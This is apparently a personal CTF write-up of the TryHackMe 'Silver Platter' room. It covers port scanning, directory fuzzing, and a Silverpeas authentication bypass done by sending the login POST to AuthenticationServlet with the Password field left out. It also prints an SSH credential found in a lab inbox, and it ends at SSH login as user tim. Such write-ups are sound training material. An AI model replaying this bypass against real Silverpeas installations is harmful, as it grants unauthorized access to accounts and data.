# Hack Log 16 - TryHackMe [Silver Platter](https://tryhackme.com/room/silverplatter)

📆:**Date:** 2025-10-07  
🔍**Objective:** Obtain user and the root flag.  
🎯**Target**: TryHackme Silver Platter (Lab CTF)  

---  

## 🛠️ Actions Taken  

### 🧰 Port and Service Enumeration

```bash

$ nmap -sV 10.201.74.112
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-16 11:03 IST
Nmap scan report for 10.201.74.112
Host is up (0.25s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
8080/tcp open  http-proxy
```
→ A webpage is being served on port 80.  
→ A http proxy is running on port 8080.  


### 📂 Directory Enumeration  

→ Enumerating site served on port 80.  
```bash

ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.201.74.112/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.201.74.112/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 215ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 230ms]
```
→ Nothing interesting.  
→ Enumerating http-proxy served on port 8080.  

```bash
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.201.74.112:8080/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.201.74.112:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

console                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 236ms]
website                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 218ms]
```
→ Visiting the "console" and "website" resulted in just page not found error.  

### 🔐 Authentication Bypass  
→ Upon exploring the website on port 80, found a message on Contacts page.  
```html
If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is "scr1ptkiddy".
```
→ The message mentions "Silverpeas" and a username "scr1ptkiddy".  
→ Silverpeas is an open-source software for collaboration in a company environment.  
→ Silverpeas was running on port 8080 at "http://10.201.74.112:8080/silverpeas". Visiting the address gave a Login Page.  
→ Upon researching about vulnerabilities in Silverpeas, found an authentication bypass vulnearbility in silverpeas.  
→ This vulnerability allows unauthenticated access by omitting the "password" field from the Login request to AuthenticationServlet.    
→ Intercepting the login request on Burp.  
  ```html
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.201.74.112:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://10.201.74.112:8080
Connection: keep-alive
Referer: http://10.201.74.112:8080/silverpeas/defaultLogin.jsp
Cookie: JSESSIONID=y-dOkJy1a-luTcqZiBg0vPXC0RAHpit9c10k9z9E.ebabc79c6d2a; defaultDomain=0; svpLogin=Manager
Upgrade-Insecure-Requests: 1
Priority: u=0, i

Login=scr1ptkiddy&Password=pass&DomainId=0
```
→ Modifying the request by completely omitting the Password filed.  

```html
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.201.74.112:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://10.201.74.112:8080
Connection: keep-alive
Referer: http://10.201.74.112:8080/silverpeas/defaultLogin.jsp
Cookie: JSESSIONID=y-dOkJy1a-luTcqZiBg0vPXC0RAHpit9c10k9z9E.ebabc79c6d2a; defaultDomain=0; svpLogin=Manager
Upgrade-Insecure-Requests: 1
Priority: u=0, i

Login=scr1ptkiddy&DomainId=0
```

→ Forwarding the intercepted request resulted in succesfull login as user "scr1ptkiddy".  
→ Upon exploring the Silverpeas portal, found 2 more users 
  - Manager
  - Administrateur
→ Attempted to login as Administrateur using the same bypass technique but it didn't worked.
→ Succesfully logged in as "Manager" via the same bypass technique.
→ The inbox of the user "Manager" on Silverpeas portal had a message
```bash
Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes. 

Username: tim

Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```
→ Found the SSH credentials.  

### SSH Login  

→ Using the found credentials, succesfully logged in via ssh as user "tim".  






